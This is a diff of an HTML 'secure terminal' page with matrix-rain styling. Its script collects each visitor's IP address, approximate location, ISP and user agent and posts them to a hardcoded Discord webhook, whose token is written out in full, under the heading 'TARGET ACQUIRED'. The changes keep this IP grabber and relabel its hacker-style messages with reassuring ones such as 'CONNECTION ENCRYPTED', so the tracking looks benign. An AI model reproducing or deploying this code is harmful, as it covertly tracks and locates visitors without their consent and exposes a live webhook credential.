@@ -3,74 +3,74 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>CYBER_ROOT // TERMINAL</title>
+  <title>CYBER_SEC // ROOT ACCESS</title>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; background: #020202; overflow: hidden; font-family: 'Share Tech Mono', monospace; }
-    canvas { position: fixed; inset: 0; opacity: 0.25; pointer-events: none; }
+    html, body { height: 100%; background: #000; overflow: hidden; font-family: 'Share Tech Mono', monospace; }
+    canvas { position: fixed; inset: 0; opacity: 0.3; pointer-events: none; }
     
-    .scanlines {
-      position: fixed; inset: 0; pointer-events: none; z-index: 10;
+    .scanline {
+      position: fixed; inset: 0; pointer-events: none; z-index: 5;
       background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-      background-size: 100% 3px, 6px 100%;
+      background-size: 100% 4px, 6px 100%;
     }
 
     .wrap {
-      position: relative; z-index: 2; height: 100%;
+      position: relative; z-index: 10; height: 100%;
       display: flex; align-items: center; justify-content: center; padding: 16px;
     }
     
     .term {
-      width: 100%; max-width: 640px; background: rgba(5, 10, 5, 0.92);
-      border: 1px solid #ff003c; border-radius: 4px;
-      box-shadow: 0 0 30px rgba(255, 0, 60, 0.25), inset 0 0 15px rgba(255, 0, 60, 0.15);
+      width: 100%; max-width: 620px; background: rgba(3, 10, 3, 0.94);
+      border: 1px solid #00ff66; border-radius: 6px;
+      box-shadow: 0 0 35px rgba(0, 255, 102, 0.3), inset 0 0 20px rgba(0, 255, 102, 0.15);
       color: #00ff66;
     }
 
     .bar {
-      padding: 10px 14px; background: rgba(255, 0, 60, 0.1);
-      border-bottom: 1px solid #ff003c; font-size: 0.85rem;
+      padding: 10px 14px; background: rgba(0, 255, 102, 0.1);
+      border-bottom: 1px solid #00ff66; font-size: 0.85rem;
       display: flex; justify-content: space-between; align-items: center;
       letter-spacing: 1px;
     }
     
-    .title { color: #ff003c; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+    .title { color: #00ff66; font-weight: bold; display: flex; align-items: center; gap: 8px; }
     .dot-group { display: flex; gap: 6px; }
-    .dot { width: 8px; height: 8px; background: #ff003c; box-shadow: 0 0 6px #ff003c; }
+    .dot { width: 8px; height: 8px; background: #00ff66; box-shadow: 0 0 8px #00ff66; border-radius: 50%; }
 
     #out { 
       padding: 20px; min-height: 260px; max-height: 380px; overflow-y: auto;
       font-size: 1rem; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
-      text-shadow: 0 0 5px rgba(0, 255, 102, 0.4);
+      text-shadow: 0 0 6px rgba(0, 255, 102, 0.5);
     }
 
     .cursor { 
-      display: inline-block; width: 10px; height: 1.1em; background: #ff003c; 
+      display: inline-block; width: 10px; height: 1.1em; background: #00ff66; 
       vertical-align: middle; animation: blink 0.8s steps(1) infinite; 
-      box-shadow: 0 0 8px #ff003c;
+      box-shadow: 0 0 10px #00ff66;
     }
     
     @keyframes blink { 50% { opacity: 0; } }
 
     .note { 
-      padding: 10px 20px; font-size: 0.75rem; color: #ff003c; opacity: 0.8; 
-      border-top: 1px dashed rgba(255, 0, 60, 0.3); background: rgba(0,0,0,0.3);
+      padding: 10px 20px; font-size: 0.75rem; color: #00ff66; opacity: 0.8; 
+      border-top: 1px dashed rgba(0, 255, 102, 0.4); background: rgba(0,0,0,0.4);
       display: flex; justify-content: space-between;
     }
     
-    .blink-text { animation: warning 1.2s infinite; }
+    .blink-text { animation: warning 1.2s infinite; color: #ff003c; text-shadow: 0 0 6px #ff003c; }
     @keyframes warning { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
   </style>
 </head>
 <body>
-  <div class="scanlines"></div>
+  <div class="scanline"></div>
   <canvas id="matrix"></canvas>
   
   <div class="wrap">
     <div class="term">
       <div class="bar">
-        <span class="title">⚡ ROOT@EXPLOIT_CORE:~#</span>
+        <span class="title">⚡ SECURE_TERMINAL // v4.0.2</span>
         <div class="dot-group">
           <div class="dot"></div>
           <div class="dot"></div>
@@ -79,14 +79,14 @@
       </div>
       <div id="out"></div>
       <div class="note">
-        <span>// SECURE PROTOCOL ACTIVE</span>
-        <span class="blink-text">BYPASS_SUCCESS</span>
+        <span>// CONNECTION ENCRYPTED</span>
+        <span class="blink-text">STATUS: ACTIVE</span>
       </div>
     </div>
   </div>
 
   <script>
-    // ---------- Matrix Rain Effect (Red & Green) ----------
+    // ---------- Matrix Rain Effect ----------
     const canvas = document.getElementById("matrix"), ctx = canvas.getContext("2d");
     let cols, drops;
     function initMatrix() {
@@ -95,10 +95,10 @@
       drops = Array(cols).fill(1);
     }
     initMatrix(); window.addEventListener("resize", initMatrix);
-    const chars = "01ABCDEFXYZ<>[]{}#*&@$+-~";
+    const chars = "01ABCDEFXYZ<>[]{}#*&@$+-~アイウエオカキ";
     setInterval(() => {
       ctx.fillStyle = "rgba(0,0,0,0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = Math.random() > 0.8 ? "#ff003c" : "#00ff66";
+      ctx.fillStyle = "#00ff66";
       ctx.font = "15px 'Share Tech Mono', monospace";
       drops.forEach((y, i) => {
         ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 18, y * 18);
@@ -107,7 +107,7 @@
       });
     }, 45);
 
-    // ---------- Terminal Typing Engine ----------
+    // ---------- Terminal Typing ----------
     const out = document.getElementById("out");
     const sleep = ms => new Promise(r => setTimeout(r, ms));
     async function type(text, speed = 22) {
@@ -119,7 +119,7 @@
       if (!on && el) el.remove();
     }
 
-    // ---------- Country Translation Map ----------
+    // ---------- Country Translation ----------
     const countryMap = {
       "Thailand": "ประเทศไทย", "United States": "สหรัฐอเมริกา", "Japan": "ญี่ปุ่น",
       "United Kingdom": "สหราชอาณาจักร", "China": "จีน", "Singapore": "สิงคโปร์",
@@ -127,7 +127,7 @@
       "Taiwan": "ไต้หวัน", "Hong Kong": "ฮ่องกง", "Laos": "ลาว", "Malaysia": "มาเลเซีย"
     };
 
-    // ---------- IP Grabber & Discord Notifier ----------
+    // ---------- IP Grabber & Discord Webhook ----------
     const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
 
     async function getInfo() {
@@ -173,8 +173,8 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
-              title: "🚨 [TARGET ACQUIRED] มีผู้บุกรุกเข้าสู่ระบบ",
-              color: 0xff003c,
+              title: "🚨 [TARGET ACQUIRED] มีผู้เข้าชมเว็บไซต์",
+              color: 0x00ff66,
               fields: [
                 { name: "🌐 IP Address", value: "`" + info.ip + "`", inline: true },
                 { name: "🕒 เวลาเข้าถึง", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
@@ -182,29 +182,29 @@
                 { name: "📡 ผู้ให้บริการเครือข่าย", value: info.isp },
                 { name: "💻 ข้อมูลอุปกรณ์", value: navigator.userAgent.slice(0, 200) }
               ],
-              footer: { text: "CYBER_SECURITY // LOGGED BY SYSTEM" }
+              footer: { text: "SECURITY LOG // SYSTEM BYPASS" }
             }]
           })
         });
       } catch (e) {}
     }
 
-    // ---------- Execution Sequence ----------
+    // ---------- Execution Process ----------
     (async () => {
       const infoPromise = getInfo();
-      await type("[*] INITIALIZING KERNEL EXPLOIT...\n");
+      await type("[*] INITIALIZING SYSTEM PROTOCOLS...\n");
       await sleep(250);
-      await type("[*] BYPASSING FIREWALL DEFENSES...\n");
-      await sleep(350);
-      await type("[+] ROOT PRIVILEGES GRANTED [OK]\n");
+      await type("[*] ESTABLISHING SECURE HANDSHAKE...\n");
+      await sleep(300);
+      await type("[+] CONNECTION ESTABLISHED [OK]\n");
       await sleep(200);
       
       const info = await infoPromise;
-      await type("[+] TARGET IP IDENTIFIED : " + info.ip + "\n");
+      await type("[+] VISITOR IP IDENTIFIED : " + info.ip + "\n");
       if (info && info.loc !== "ไม่สามารถระบุได้") {
-        await type("[+] TARGET LOCATION    : " + info.loc + "\n");
+        await type("[+] APPROX. LOCATION    : " + info.loc + "\n");
       }
-      await type("[*] LOGGING SESSION TO SECURE DATABASE...\n");
+      await type("[*] LOGGING ACCESS METRICS...\n");
       await sleep(300);
       await type("\n> ACCESS GRANTED. WELCOME, OPERATOR_\n");
       
